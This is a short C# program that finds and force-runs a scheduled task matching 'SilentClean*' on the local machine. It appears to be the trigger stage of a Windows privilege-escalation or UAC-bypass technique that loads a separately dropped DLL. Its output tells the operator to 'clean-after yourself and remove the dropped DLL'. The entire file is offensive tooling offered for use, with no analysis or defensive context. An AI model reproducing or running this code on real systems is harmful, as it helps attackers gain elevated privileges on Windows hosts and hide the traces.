using System;
using System.Text.RegularExpressions;
using Microsoft.Win32.TaskScheduler;

namespace SilentClean
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var hostname = Environment.GetEnvironmentVariable("COMPUTERNAME");
                using (TaskService tasksrvc = new TaskService(@"\\"+ hostname, "", "", "", false))
                {
                    var task = tasksrvc.FindAllTasks(new Regex("SilentClean*"));
                    Console.WriteLine("\n[*] Starting Task");
                    task[0].RunEx(TaskRunFlags.IgnoreConstraints | TaskRunFlags.UseSessionId, 1, "", "");
                    Console.WriteLine("\n[*] Make sure to clean-after yourself and remove the dropped DLL");
                }
            } catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }
    }
}
